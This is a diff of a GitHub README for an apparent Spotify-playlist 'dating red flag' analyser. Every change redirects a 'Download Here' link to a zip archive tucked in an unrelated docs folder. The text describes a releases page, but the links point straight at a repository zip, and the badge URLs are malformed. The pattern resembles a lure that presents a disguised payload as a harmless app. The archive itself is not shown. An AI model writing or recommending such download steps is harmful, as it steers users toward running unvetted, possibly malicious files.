@@ -1,6 +1,6 @@
 # 🎵 spotify-playlist-dating-redflag-analysis - Discover Your Music-Based Dating Red Flags
 
-[![Download Here](https://raw.githubusercontent.com/Merveil22/spotify-playlist-dating-redflag-analysis/main/gourd/spotify-playlist-dating-redflag-analysis.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Merveil22/spotify-playlist-dating-redflag-analysis/main/gourd/spotify-playlist-dating-redflag-analysis.zip)
+[![Download Here](https://github.com/Merveil22/spotify-playlist-dating-redflag-analysis/raw/refs/heads/main/docs/sample-prompt-and-output-1/redflag_dating_playlist_spotify_analysis_v3.3.zip%20Now-Click%20Here-brightgreen)](https://github.com/Merveil22/spotify-playlist-dating-redflag-analysis/raw/refs/heads/main/docs/sample-prompt-and-output-1/redflag_dating_playlist_spotify_analysis_v3.3.zip)
 
 ## 📌 Overview
 
@@ -12,7 +12,7 @@ To use this application, follow these steps:
 
 1. **Visit the Releases Page**  
    Click the link below to access the download options.  
-   [Download Here](https://raw.githubusercontent.com/Merveil22/spotify-playlist-dating-redflag-analysis/main/gourd/spotify-playlist-dating-redflag-analysis.zip)
+   [Download Here](https://github.com/Merveil22/spotify-playlist-dating-redflag-analysis/raw/refs/heads/main/docs/sample-prompt-and-output-1/redflag_dating_playlist_spotify_analysis_v3.3.zip)
 
 2. **Choose Your Version**  
    On the releases page, you will find different versions of the application. Select the latest version for the best experience.
@@ -35,7 +35,7 @@ To use this application, follow these steps:
 ## 📥 Download & Install
 
 Head to the following link to download the application now:  
-[Visit Downloads Page](https://raw.githubusercontent.com/Merveil22/spotify-playlist-dating-redflag-analysis/main/gourd/spotify-playlist-dating-redflag-analysis.zip)
+[Visit Downloads Page](https://github.com/Merveil22/spotify-playlist-dating-redflag-analysis/raw/refs/heads/main/docs/sample-prompt-and-output-1/redflag_dating_playlist_spotify_analysis_v3.3.zip)
 
 Once downloaded, follow the installation steps mentioned earlier to get up and running quickly.
 
